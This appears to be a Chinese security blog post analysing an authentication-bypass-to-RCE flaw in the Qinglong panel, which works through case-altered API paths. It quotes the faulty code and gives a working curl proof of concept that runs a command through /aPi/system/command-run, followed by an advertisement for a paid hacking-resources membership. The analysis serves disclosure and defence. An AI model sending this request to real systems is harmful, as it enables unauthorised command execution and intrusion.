#  0day 青龙面板 最新版本 鉴权绕过导致 RCE 分析  
原创 棉花糖糖糖
                    棉花糖糖糖  棉花糖fans   2026-02-27 04:56  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=13&wx_lazy=1&tp=wxpic "")  
  
#   
## 1. 漏洞摘要青龙面板最新版存在一处鉴权绕过漏洞，未认证请求可访问高权限接口，并最终触发命令执行。攻击者可通过大小写变形路径（如 /API/...）绕过鉴权并命中 /api/... 实际路由。由于 /api/system/command-run 可执行系统命令，最终形成未授权远程命令执行（RCE）。2026年2月24日在github已有用户被植入挖矿，26日绿联从应用商店下架青龙面板。目前社区反馈项目官方后暂无回应，建议关闭青龙面板的公网访问。  
## 2. 漏洞分析  
  
back/loaders/express.ts  
```
path: [...config.apiWhiteList, /^\/(?!api\/).*/]
```  
  
这里的正则匹配写的有问题，严格匹配了纯小写的api，只要不是 /api/  
 开头，就会绕过 JWT 校验，自定义鉴权中间件使用的是req.path.startsWith判断，它也是严格判断纯小写，并直接放行：  
```
if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {  return next();}
```  
  
所以/API/这类路径会跳过令牌校验，同时又因为Express 默认大小写不敏感，/API/...  
 还能匹配到 /api/...  
 这个路由。  
```
app.use(config.api.prefix, routes());
```  
  
最终绕过了全部鉴权，随意调用后端api，青龙面板的api中有超多可利用的点，随便找一个命令执行的接口就可以利用。  
## 3.POC：  
```
curl -X PUT "http://localhost:5700/aPi/system/command-run" \     -H "Content-Type: application/json" \-d '{"command": "id"}'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlPib5oxD3a5zBHXQk6ZAjqDAIBrZKHibsl70RLdAghKkYLcG0qnG5wFyedOXYEwjFuvBc66VqetaG53JziauDfo6gHGialLIKWADQU/640?wx_fmt=png&from=appmsg "")  
  
广告时间：  
  
棉花糖会员站  
  
网络安全行业领先网站｜在线独立环境内网靶场  
  
性价比拉满，进站不心动来砍我  
  
开通说明  
  
糖心会员仅需99元/年，续费8折，会员邀请好友开通/续费享15%佣金。  
  
网站性质特殊，开通不支持退款，请确认需求后再开通。  
  
Part 01｜无境靶场  
  
提供会员免费在线独立环境网安靶场；内网靶场同样独立环境；持续更新内网/Web/原创/SRC/CTF靶场，一直加量不加价。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMCYXEiclKIFNCpSEa1hFHRZGj6YFcmLicPtS6CXM9yYHkibu1IFkCqUpn6Ha8xYQTHdhq5ZFz0fjzmHWy6MtCtbYPvfDibzmqSA6k/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
  
  
Part 02｜独家代码审计工具  
  
无需本地编译，支持全路由报告，适合实战审计与日常排查。  
  
Part 03｜POC库  
  
全网最新/体量大的POC资源聚合；公开与付费POC统一检索；配合微信会员服务号，关键词即可查找相关POC。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMkvJQhFGxCziatqQmaXiaJPIHgsVORoUf6Rm8rBeicO0ZB8c9fDabaY9Wib1AXibmhTBJZ3umEwwIZpcKazf34R5RCn73eYG68EYAE/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=14 "")  
  
  
Part 04｜账号共享  
  
会员享受网安常用服务，含资产引擎，以及Shodan、CTF平台等，满足学习与工作需求。  
  
Part 05｜更多在线工具  
  
hash解密平台、SRC资产监控、含国标/国密文件获取、凌风云搜索结果获取、IP街道级定位公益服务（ip.sy）、XSS平台等实用工具。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNusf4BFUpEQA1vYcPRUaJpJ82eHVXO9UjnTZkwv1Adhicvmzp80XO0ADmShgibZA35sOV4j1M0OMNmY2Vd824fBkohkfdaremT0/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=15 "")  
  
  
Part 06｜文档工具库  
  
覆盖护网、应急响应、面试、CTF等场景，资源量大；同样支持微信服务号全文关键词检索。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlNhOuOL6FdnSBGgcrdeFiaoXbNlcVLAN7UVtD641kvLENTmRmYMfRiaqY70nOnlB0EB1pN5Q7LYm9lIkq6ia86GrJ13mHAhH1icJb8/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=16 "")  
  
  
Part 07｜教程大全  
  
聚合大量资源网/源码网/教程站会员内容，减少多站重复付费成本，学习路径更集中。  
  
Part 08｜会员专属群  
  
加入微信500人付费会员群，拥有网安领域更精准的交流环境。  
  
Part 09｜用户好评  
  
付费服务持续三年，在期会员三千位，好评稳定；本文仅展示部分资源，更多网站内容可点击阅读原文进入网站后查看：  
vip.bdziyi.com  
  
  
  
